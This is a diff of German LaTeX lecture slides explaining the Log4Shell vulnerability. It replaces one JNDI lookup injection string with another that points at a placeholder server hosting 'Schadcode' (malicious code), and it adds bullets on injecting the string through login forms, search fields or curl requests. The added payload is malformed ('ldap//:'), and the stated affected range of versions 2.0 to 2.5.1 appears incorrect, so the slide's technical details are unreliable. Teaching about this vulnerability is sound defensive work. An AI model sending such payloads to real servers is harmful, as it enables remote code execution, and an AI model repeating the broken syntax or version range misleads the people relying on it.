@@ -144,7 +144,17 @@ $\Rightarrow$ 'Lightweight Directory Access Protocol'
 \end{frame}
 \section{Log4Shell}
 \begin{frame}{Log4Shell}
-\${jndi:ldap://somedomain.com/powned}
+\begin{center}
+$\Rightarrow$ \textbf{\$\{jndi:ldap//:myserver.de/schadcode\}}
+\end{center}
+\begin{itemize}
+\item Injektion durch User-Eingaben oder händisch\\
+- Anmeldeformulare, Suchfunktion\\
+- Http Request mit curl\\
+ \item Ab Version 2.0 bis 2.5.1 möglich
+\end{itemize}
+
+
 \end{frame}
 
 
